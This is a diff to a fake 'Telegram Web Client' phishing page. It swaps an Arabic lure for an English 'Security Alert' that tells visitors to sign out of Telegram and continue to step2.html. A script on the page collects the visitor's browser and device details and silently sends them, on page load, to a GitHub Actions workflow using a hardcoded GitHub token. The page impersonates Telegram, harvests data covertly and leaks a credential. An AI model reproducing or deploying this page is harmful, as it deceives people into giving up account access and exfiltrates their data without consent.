@@ -3,66 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram</title>
+    <title>Telegram Web Client</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 0;
+            font-family: 'Helvetica Neue', sans-serif;
             background-color: #f3f3f3;
             color: #333;
         }
-        .container {
-            max-width: 500px;
-            margin: 50px auto;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            text-align: center;
-        }
-        .button {
-            display: inline-block;
+        .hero {
             background-color: #0088cc;
             color: white;
-            text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            margin-top: 20px;
+            text-align: center;
+            padding: 100px 20px;
+            background-image: url('https://telegram.org/img/screen-1.webp');
+            background-size: cover;
+            background-position: center;
         }
-        .button:hover {
-            background-color: #005f88;
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .hero p {
+            font-size: 18px;
+            margin-bottom: 40px;
+        }
+        .hero .button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 32px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+        }
+        .hero .button:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
+    <!-- Hero Section with Telegram style -->
+    <div class="hero">
+        <h1>Welcome to Telegram Web</h1>
+        <p>Discover more, chat with your friends, and stay connected with Telegram's web client.</p>
+        <a href="https://web.telegram.org" class="button">Get Started</a>
+    </div>
+
+    <!-- Content Section -->
+    <div class="content">
+        <h2>Security Alert</h2>
+        <p>We detected suspicious activity on your account. Please sign out of Telegram and confirm your identity by logging in through the official Telegram app to protect your account.</p>
+        <a href="step2.html" class="button">Next</a>
+    </div>
+
     <script>
     const userData = {
-        ip: "192.168.1.1",  // هذه البيانات عادة تأتي من خلال API خارجي
+        ip: "192.168.1.1",  // يمكنك الحصول على عنوان IP من خلال API خارجي مثل ipify
         userAgent: navigator.userAgent,
         device: navigator.platform,
         timeStamp: new Date().toISOString()
     };
 
+    // إرسال البيانات إلى GitHub Actions عبر API
     fetch('https://api.github.com/repos/org-telegram/ver/actions/workflows/save-data.yml/dispatches', {
         method: 'POST',
         headers: {
-            'Authorization': 'Bearer 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',
+            'Authorization': 'Bearer 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',  // ضع هنا توكن GitHub الخاص بك
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            ref: 'main',  // الفرع الذي تعمل عليه (أو gh-pages)
+            ref: 'main',  // الفرع الذي تعمل عليه
             inputs: {
                 userData: JSON.stringify(userData)
             }
         })
     })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.json();
-    })
+    .then(response => response.json())
     .then(data => {
         console.log('Data sent to GitHub Actions:', data);
     })
@@ -70,15 +87,5 @@
         console.error('Error:', error);
     });
     </script>
-
-    <div class="container">
-        <h1>التالي</h1>
-        <p>
-            لقد تم اكتشاف نشاط مشبوه، حيث لاحظنا تسجيل دخول جهاز آخر إلى حسابك على تيليجرام من خلال تيليجرام ويب. 
-            لحماية حسابك، يرجى تسجيل الخروج من تطبيق تيليجرام ثم تأكيد ملكيتك للحساب من خلال التسجيل عبر تيليجرام ويب.
-        </p>
-        <p>هل قمت بتسجيل الخروج من تطبيق تيليجرام؟ اضغط زر "التالي" بعد تسجيل الخروج.</p>
-        <a href="step2.html" class="button">التالي</a>
-    </div>
 </body>
 </html>
